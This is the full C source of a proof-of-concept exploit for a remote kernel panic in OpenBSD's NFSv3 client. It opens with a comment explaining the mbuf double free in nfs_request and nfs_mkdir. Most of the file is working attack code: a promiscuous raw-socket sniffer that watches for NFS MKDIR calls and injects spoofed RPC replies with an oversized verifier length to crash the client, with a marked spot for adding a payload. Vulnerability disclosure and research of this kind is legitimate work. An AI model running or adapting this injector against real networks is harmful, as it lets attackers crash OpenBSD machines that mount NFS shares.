/*
 * What: PoC for OpenBSD (all versions up to 7.5) NFSv3 Client Remote Kernel Panic
 * Why: Why not.
 * When: Bug found many years ago, this PoC was written in August 2024
 * Author: Claes M Nyberg <cmn@signedness.org>
 *
 * Copyright (C)  2023-2024 Claes M Nyberg <cmn@signedness.org>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by Claes M Nyberg.
 * 4. The name Claes M Nyberg may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */


 /*
 \ While processing an NFSv3 RPC reply, the verifier length is used to advance in 
 / the response buffer. Providing a value bigger than zero result in the line 
 \ commented with "Should not happen" being executed.
 /
 \ /usr/src/sys/nfs/nfs_socket.c
 / 847 int
 \ 848 nfs_request(struct vnode *vp, int procnum, struct nfsm_info *infop)
 / 849 {
 \ [...]
 / 980      *
 \ 981      * Since we only support RPCAUTH_UNIX atm we step over the
 / 982      * reply verifer type, and in the (error) case that there really
 \ 983      * is any data in it, we advance over it.
 / 984      *
 \ 985     tl++;           // Step over verifer type *
 / 986     i = fxdr_unsigned(int32_t, *tl);
 \ 987     if (i > 0)
 / 988             nfsm_adv(nfsm_rndup(i));    // Should not happen *
 \
 /
 \ The macros for nfsm_adv(nfsm_rndup(i)); are defined as follows:
 /
 \ #define nfsm_rndup(a)   (((a)+3)&(~0x3))
 /
 \ #define nfsm_adv(s) {                           \
 /   t1 = mtod(info.nmi_md, caddr_t) + info.nmi_md->m_len -      \
 \       info.nmi_dpos;                      \
 /   if (t1 >= (s)) {                        \
 \       info.nmi_dpos += (s);                   \
 /   } else if ((t1 = nfs_adv(&info.nmi_md, &info.nmi_dpos,      \
 \         (s), t1)) != 0) {                     \
 /       error = t1;                     \
 \       m_freem(info.nmi_mrep);                 \
 /       goto nfsmout;                       \
 \   }                               \
 / }
 \
 / If the verifier length value is large enough, nfs_adv() will fail
 \ because a short mbuf chain, resulting the the mbuf being free'd 
 / (m_freem(info.nmi_mrep)).
 \
 / When the mbuf is free'd by the m_free function, it is placed in a pool 
 \ for available mbuf's and the next mbuf and next packet pointer inside 
 / the mbuf is converted to magic values used by the pool datastructure.
 \
 / When an mbuf is double-free'd, the next pointer which now holds the 
 \ pool magic value is referenced, resulting in a kernel panic since it 
 / is not a valid address.
 \
 / There are multiple RPC reply's affected by this nfs_request, 
 \ using for example nfs_mkdir(), the mbuf is freed again at the end 
 / of the function:
 \
 / /usr/src/sys/nfs/nfs_vnops.c
 \ 1883  *
 / 1884  * nfs make dir call
 \ 1885  *
 / 1886 int
 \ 1887 nfs_mkdir(void *v)
 / ...
 \ 1932        m_freem(info.nmi_mrep);   
 /
 \ The overwritten pointer to the next mbuf is then dereferenced when the 
 / chain is traversed inside m_freem(), causing a kernel panic.
 \
*/

#define _GNU_SOURCE 

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <getopt.h>
#include <endian.h>
#include <time.h>

#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>

#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#include <sys/socket.h>
#include <features.h>    /* for the glibc version number */
#if __GLIBC__ >= 2 && __GLIBC_MINOR >= 1
#include <netpacket/packet.h>
#include <net/ethernet.h>     /* the L2 protocols */
#else
#include <asm/types.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>   /* The L2 protocols */
#endif
#include <linux/sockios.h>
#include <linux/if.h>


struct rpchdr {
    uint32_t xid;
    uint32_t msgtype;
    #define RPC_MSG_TYPE_CALL   0
    #define RPC_MSG_TYPE_REPLY  1

    uint32_t version;
    uint32_t program;
    #define RPC_PROGRAM_NFS         100003
    #define RPC_PROGRAM_PORTMAP     100000
    #define RPC_PROGRAM_MOUNT       100005

    uint32_t program_version;
    uint32_t procedure;
    #define RPC_NFS_PROCEDURE_GETATTR           1
    #define RPC_NFS_PROCEDURE_SETATTR           2
    #define RPC_NFS_PROCEDURE_LOOKUP            3
    #define RPC_NFS_PROCEDURE_ACCESS            4
    #define RPC_NFS_PROCEDURE_READLINK          5
    #define RPC_NFS_PROCEDURE_READ              6
    #define RPC_NFS_PROCEDURE_WRITE             7
    #define RPC_NFS_PROCEDURE_CREATE            8
    #define RPC_NFS_PROCEDURE_MKDIR             9
    #define RPC_NFS_PROCEDURE_SYMLINK           10
    #define RPC_NFS_PROCEDURE_REMOVE            12
    #define RPC_NFS_PROCEDURE_RMDIR             13
    #define RPC_NFS_PROCEDURE_RENAME            14
    #define RPC_NFS_PROCEDURE_READDIR           16
    #define RPC_NFS_PROCEDURE_READDIRPLUS		17
/*
    #define RPC_NFS_PROCEDURE_FSSTAT
    #define RPC_NFS_PROCEDURE_FSINFO
    #define RPC_NFS_PROCEDURE_PATHCONF
    #define RPC_NFS_PROCEDURE_MKNOD
*/
    #define RPC_PORTMAP_PROCEDURE_GETPORT       3
    #define RPC_MOUNT_PROCEDURE_MNT             1


    struct credentials {
        uint32_t flavor;
        uint32_t length; /* Total length minus size of flavor and length */

        /* Rest goes here */
    } creds __attribute__((packed));
};

struct verifier {
    uint32_t flavor;
    uint32_t length;
} __attribute__((packed));

struct rpc_reply_hdr {
    uint32_t xid;
    uint32_t msgtype;
    uint32_t reply_state;
    struct verifier v;
    uint32_t accept_state;
} __attribute__((packed));



/* Global settings */
struct conf {
    uint32_t dry_run;
    uint32_t verbose;
    char *iface;
    int sd;
};

struct conf settings;

/*
 * Verbose output
 */
static void
verbose(unsigned int level, char *fmt, ...)
{
    va_list ap;

    if (level <= settings.verbose) {
		char tstr[256];
        struct tm *tm;
		time_t t;

		time(&t);
		tm = localtime(&t);
		strftime(tstr, sizeof(tstr), "%Y-%m-%d %H:%M:%S", tm);
		printf("[%s] ", tstr);

		va_start(ap, fmt);
        vprintf(fmt, ap);
        va_end(ap);
    }
}

/*
 * Generates header checksum.
 * From W. Richard Stevens TCP/IP illustrated
 */
static uint16_t
rawpkt_chksum(uint16_t *addr, int len)
{
    const uint16_t *w;
    uint16_t answer;
    uint32_t sum;
    int nleft;

        w = addr;
        sum = 0;
        nleft = len;

    /*
     *  Our algorithm is simple, using a 32 bit accumulator (sum),
     *  we add sequential 16 bit words to it, and at the end, fold
     *  back all the carry bits from the top 16 bits into the lower
     *  16 bits.
     */
    while (nleft > 1)  {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1)
        sum += htons(*(u_char *)w<<8);

    /*
     * add back carry outs from top 16 bits to low 16 bits
     */
    sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
    sum += (sum >> 16);         /* add carry */
    answer = ~sum;              /* truncate to 16 bits */
    return (answer);
}

static uint16_t
udp4_cksum(struct iphdr *ip, struct udphdr *udp, uint8_t *payload, uint32_t paylen)
{
    uint8_t *pbuf;
    struct udphdr *udph;
    uint16_t sum;
	uint32_t buflen;

    struct phdr {
        uint32_t phd_saddr;    /* Source address */
        uint32_t phd_daddr;    /* Destination address */
        uint8_t phd_zero;      /* Zero byte */
        uint8_t phd_proto;     /* Protocol code */
        uint16_t phd_len;     /* Length of TCP/UDP header plus data */
    } __attribute__((packed)) *phdr;

    if (ip == NULL || udp == NULL) {
		verbose(0, "** Error: received NULL header(s)\n");
        return(0);
	}

	buflen = (sizeof(struct iphdr) + sizeof(struct udphdr) + paylen)*2;
    if ( (pbuf = malloc(buflen)) == NULL) {
		verbose(0, "** Error: malloc(%u) failed\n", buflen);
        return(0);
    }

    memset(pbuf, 0x00, buflen);

    /* Build Pseudo header  */
    phdr = (struct phdr *)pbuf;
    phdr->phd_saddr = ip->saddr;
    phdr->phd_daddr = ip->daddr;
    phdr->phd_zero = 0;
    phdr->phd_proto = IPPROTO_UDP;
    phdr->phd_len = htons(sizeof(struct udphdr) + paylen);

    /* Build UDP header */
    udph = (struct udphdr *)((uint8_t *)pbuf + sizeof(struct phdr));
        udph->uh_sport = udp->uh_sport;
        udph->uh_dport = udp->uh_dport;
        udph->uh_ulen = htons(sizeof(struct udphdr) + paylen);
        udph->uh_sum = 0;

    if (payload != NULL && paylen != 0) {
        memcpy(pbuf + sizeof(struct phdr) +
            sizeof(struct udphdr), payload, paylen);
    }

    sum = rawpkt_chksum((uint16_t *)pbuf,
        sizeof(struct phdr) +
        sizeof(struct udphdr) + paylen);
    free(pbuf);

	verbose(4, "Calculated udp checksum 0x%x\n", sum);
    return (sum);
}

static int
pkt_checksum(unsigned char *pkt, size_t len)
{
	struct ethhdr *eh;
	struct iphdr *iph;
	struct udphdr *udp;
	uint8_t *payload;
	int paylen;
	int payoff;
	int iplen;

	if (len < sizeof(struct ethhdr))
		return 0;

	eh = (struct ethhdr *)pkt;
	if (ntohs(eh->h_proto) == ETH_P_IP) {
		verbose(4, "Computing IP packet checksum\n");

		if (len < (sizeof(struct ethhdr) + sizeof(struct iphdr))) {
			verbose(4, "Ignoring truncated packet\n");
			return 1;
		}

		payload = NULL;
		paylen = 0;
		payoff = 0;
		iph = (struct iphdr *)((uint8_t *)eh + sizeof(struct ethhdr));
		iplen = (iph->ihl * 4);

		/* Adjust possible fuzzed ip header length */
		if (iplen > len) {
			verbose(0, "** Warning: Ignoring packet with bad ip header length \n");
			return -1;
		}

		switch (iph->protocol) {

			/* ICMP */
			case 1:
				break;

			/* IGMP */
			case 2:
				break;

			/* TCP */
			case 6:
				verbose(1, "Ignoring checksum for TCP\n");
				return -1;
				break;

			/* UDP */
			case 17:
				udp = (struct udphdr *)((uint8_t *)iph + (iph->ihl * 4));
				payoff = sizeof(struct ethhdr) + (iph->ihl * 4) + sizeof(struct udphdr);

                /* We might have fuzzed som header lengt field, just use
                 * fixed header sizes */
                if (payoff > len) {
                    payoff = sizeof(struct ethhdr) + sizeof(struct iphdr);
                    payoff += sizeof(struct  udphdr);

                    if (payoff > len) {
                        verbose(0, " ** Error: Malformated packet length");
                        return 0;
                    }

                    verbose(3, "Adjusted corrupted payload length");
                }

				paylen = len - payoff;
				if (paylen > 0)
					payload = (uint8_t *)pkt + payoff;

				udp->uh_sum = udp4_cksum(iph, udp, payload, paylen);
				break;

			default:
				return 0;
		}

		/* Set IP checksum */
		iph->check = 0;
		iph->check = rawpkt_chksum((uint16_t *)iph, iph->ihl * 4);
		verbose(4, "Calculated IPv4 checksum 0x%04x\n", iph->check);
	}

	return 0;
}


/*
 * Open a raw socket and bind to interface.
 * Return -1 on error, fie descriptor on success.
 */
static int
open_rawsock(const char *iface)
{
	struct sockaddr_ll lla;
	struct ifreq ethreq;
	int sd;

	/* Open Raw Socket */
	if ( (sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
		fprintf(stderr, "** Error opening raw socket: %s\n", strerror(errno));
		return -1;
	}

	memset(&lla, 0x00, sizeof(lla));
	lla.sll_family = PF_PACKET;
	lla.sll_protocol = htons(ETH_P_ALL);
	lla.sll_ifindex = if_nametoindex(iface);
	if (bind(sd, (struct sockaddr*) &lla, sizeof(lla)) < 0) {
		fprintf(stderr, "** Error: bind() raw socket to %s: %s\n", 
			iface, strerror(errno));
		return -1;
	}


	/* Get interface flags */
	strncpy(ethreq.ifr_name, iface, IFNAMSIZ);
	if (ioctl(sd, SIOCGIFFLAGS, &ethreq) == -1) {
		fprintf(stderr, "** Error: ioctl(SIOCGIFFLAGS): %s\n", strerror(errno));
		close(sd);
		return -1;
	}

	/* Set promiscuos mode */
	ethreq.ifr_flags |= IFF_PROMISC;
	if (ioctl(sd, SIOCSIFFLAGS, &ethreq) == -1) {
		fprintf(stderr, "** Error: ioctl(SIOCSIFFLAGS): %s\n", strerror(errno));
		close(sd);
		return -1;
	}

	return sd;
}


/*
 * Receive frame using raw socket bound to interface
 */
static ssize_t
recvframe(int sd, char *buf, size_t buflen)
{
	ssize_t n;
	n = recvfrom(sd, buf, buflen, 0, NULL, NULL);
	return n;
}


/*
 * Send frame using raw socket bound to interface
 */
static ssize_t
sendframe(int sd, char *frame, size_t len)
{
	ssize_t n;

	n = sendto(sd, frame, len, 0, NULL, 0);
	return n;
}

char *
ipstr(uint32_t ip)
{
	struct in_addr ina;

	ina.s_addr = ip;
	return inet_ntoa(ina);
}

static uint8_t *
evil_rpc_call_reply(struct ether_header *s_eh, struct iphdr *s_iph, 
		struct udphdr *s_udph, struct rpchdr *rc, uint8_t *payload, 
		size_t paylen, size_t *save_len)
{
	struct ether_header *eh;
	struct iphdr *iph;
	struct udphdr *udph;
	struct rpc_reply_hdr *rh;
	size_t len;
	static uint8_t buf[8192];
	char sip[32];
	char dip[32];

	len = 0;

	if (rc->msgtype != RPC_MSG_TYPE_CALL) {
		verbose(3, "** Error: Ignoring non RPC CALL packet\n");
		return NULL;
	}

	snprintf(sip, sizeof(sip), "%s", ipstr(s_iph->saddr));
	snprintf(dip, sizeof(dip), "%s", ipstr(s_iph->daddr));

	if (rc->procedure != RPC_NFS_PROCEDURE_MKDIR) {
		verbose(1, "** Ignoring RPC Call (%2d) %s -> %s\n", rc->procedure, sip, dip);
		return NULL;
	}

	verbose(0, "Detected RPC Call (%d) %s -> %s\n", rc->procedure, sip, dip);

	memset(buf, 0x00, sizeof(buf));
	eh = (struct ether_header *)buf;
	iph = (struct iphdr *)(buf + sizeof(struct ether_header));
	udph = (struct udphdr *)(buf + sizeof(struct ether_header) + sizeof(struct iphdr));
	rh = (struct rpc_reply_hdr *)((uint8_t *)udph + sizeof(struct udphdr));

	/* Ethernet header */
	memcpy(eh->ether_dhost, s_eh->ether_shost, ETH_ALEN);
	memcpy(eh->ether_shost, s_eh->ether_dhost, ETH_ALEN);
	eh->ether_type = s_eh->ether_type;

	/* IP header */
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = s_iph->tos;
	iph->tot_len = 0; /* set below */
	iph->id = s_iph->id;
	iph->frag_off = 0;
	iph->ttl = 64;
	iph->protocol = 17; /* UDP */
	iph->check = 0;
	iph->saddr = s_iph->daddr;
	iph->daddr = s_iph->saddr;

	/* UDP header */
	udph->uh_sport = s_udph->uh_dport;
	udph->uh_dport = s_udph->uh_sport;
	udph->uh_ulen = 0; /* This is set below */
	udph->uh_sum = 0;

	/* Length of reply buffer so far */
	len = sizeof(struct ether_header) + sizeof(struct iphdr) + 
		sizeof(struct udphdr) + sizeof(struct rpc_reply_hdr);
	verbose(2, "Processing RPC Call payload of %lu bytes\n", paylen);
	
	/* Set up the RPC Reply header */
	rh = (struct rpc_reply_hdr *)((uint8_t *)udph + sizeof(struct udphdr));
	rh->xid = htonl(rc->xid);
	rh->msgtype = htonl(RPC_MSG_TYPE_REPLY);
	rh->reply_state = htonl(0);
	rh->v.flavor = htonl(0);	
	rh->v.length = htonl(0x0000ffff); 
	rh->accept_state = htonl(0);

	/* Add your payload here! */
#define PAYLOAD_LEN 1200
	memset(&buf[len], 0x41, PAYLOAD_LEN);
	len += PAYLOAD_LEN;

	iph->tot_len = htons(len - sizeof(struct ether_header));
	udph->uh_ulen = htons(sizeof(struct udphdr) + sizeof(struct rpc_reply_hdr) + PAYLOAD_LEN);

	pkt_checksum(buf, len);
	if (save_len != NULL)
			*save_len = len;

	return buf;

}

static int
sniffer_loop(int sd)
{
	uint8_t buf[0x40000];
	ssize_t n;

	verbose(0, "Sniffer running\n");

	while (1) {
		struct ether_header *eh;
		struct iphdr *iph;
		struct udphdr *udph;
		uint8_t *payload;
		size_t paylen;

		eh = NULL;
		iph = NULL;
		udph = NULL;
		payload = NULL;
		paylen = 0;

		memset(buf, 0x00, sizeof(buf));
		if ( (n = recvframe(sd, (char *)buf, sizeof(buf))) < 0) {
			fprintf(stderr, "** Error: recvframe(): %s\n", strerror(errno));
			return -1;
		}

		if (n == 0) {
			verbose(1, "** Received zero size frame\n");
			continue;
		}

		/* Ethernet header */
		if (n <= sizeof(struct ether_header)) {
			verbose(3, "** Ignoring short packet (does not fit Ethernet)\n");
			continue;
		}
		eh = (struct ether_header *)buf;

		if (ntohs(eh->ether_type) != 0x0800) {
			verbose(3, "** Ignoring non IPv4 packet\n");
			continue;
		}

		/* IPv4 header */
		if ( (n < (sizeof(struct ether_header) + sizeof(struct iphdr)))) {
			verbose(3, "** Ignoring short packet (does not fit IPv4 header)\n");
			continue;
		}
		iph = (struct iphdr *)((uint8_t *)eh + sizeof(struct ether_header));

		if (iph->version != 4) {
			verbose(3, "** Ignoring IPv%d packet\n", iph->version);
			continue;
		}

		switch (iph->protocol) {

			case 17:
				/* UPD header */
				if (n < (sizeof(struct ether_header) + (iph->ihl * 4) + sizeof(struct udphdr))) {
					verbose(3, "** Ignoring short packet (does not fit UDP header)\n");
					continue;
				}		
				udph  = (struct udphdr *)((uint8_t *)iph + (iph->ihl * 4));
				payload = (uint8_t *)udph + sizeof(struct udphdr);
				paylen = n - (sizeof(struct ether_header) + (iph->ihl * 4) + sizeof(struct udphdr));
				verbose(5, "Received UDP packet (%u bytes)\n", paylen);
				break;

				default:
					
					continue;
		}


		/* Check for RPC */
		if (udph != NULL) {
			struct rpchdr *rc;	
		
			/* RPC header */
			if (paylen >= sizeof(struct rpchdr)) {
				rc = (struct rpchdr *)payload;

				/* Convert to hos endian */
				rc->xid = ntohl(rc->xid);
				rc->msgtype = ntohl(rc->msgtype);
				rc->version = ntohl(rc->version);
				rc->program = ntohl(rc->program);
				rc->program_version = ntohl(rc->program_version);
				rc->procedure = ntohl(rc->procedure);
		
				/* Check for RPC NFS Call */
				if ((rc->msgtype == RPC_MSG_TYPE_CALL) && (rc->program == RPC_PROGRAM_NFS)) {
					uint8_t *pkt;
					size_t len;
					size_t pl = paylen - sizeof(struct rpchdr);
					uint8_t *data;
					
					verbose(4, "Received RCP Call Program Procedure %d/%d with xid 0x%08x\n", 
						rc->program, rc->procedure, rc->xid);

					data = payload + sizeof(struct rpchdr);

					if ( (pkt = evil_rpc_call_reply(eh, iph, udph, rc, data, pl, &len)) != NULL) {
						if (settings.dry_run == 0) {
							verbose(0, "--> Injecting evil reply frame (%u bytes) to %s\n", len, ipstr(iph->saddr));
							if (sendframe(sd, (char *)pkt, len) < 0) {
								fprintf(stderr, "** Error: sendframe(): %s\n", strerror(errno));
							}
						}
					}
				}
			}
		}
	}

	return 0;
}


void
usage(char *pname)
{
	printf("\n");
	printf("Usage: %s <iface> [Option(s)]\n", pname);
	printf("Options:\n");
	printf(" -d --dry-run            - Do not inject frames\n");
	printf(" -v --verbose            - Verbose level, repeat to increase\n");
	printf("\n");
	exit(EXIT_FAILURE);
}

/* Commandline options */
const struct option longopts[] =
{
    {"dry-run", 0, NULL, 'd'},
    {"verbose", 0, NULL, 'v'},
    {NULL, 0, NULL, 0}
};


int
main(int argc, char **argv)
{
	int longindex;
	int i;

	printf("[+] OpenBSD NFSv3 Client Remote Kernel Panic\n");
	printf("[+] Author: Claes M Nyberg <cmn@signedness.org>\n");
	printf("\n");

	if (argc < 2) 
		usage(argv[0]);


	memset(&settings, 0x00, sizeof(settings));
	settings.iface = argv[1];

	while ( (i = getopt_long(argc-1, &argv[1], "dv", 
		longopts, &longindex)) != -1) {
		switch (i) {
			case 'd':
				settings.dry_run = 1;
				break;

			case 'v':
				settings.verbose++;
				break;

			default:
				usage(argv[0]);
		}
	}

	settings.iface = argv[1];
	if ( (settings.sd = open_rawsock(settings.iface)) == -1) 
		exit(EXIT_FAILURE);

	sniffer_loop(settings.sd);
	exit(EXIT_FAILURE);
}
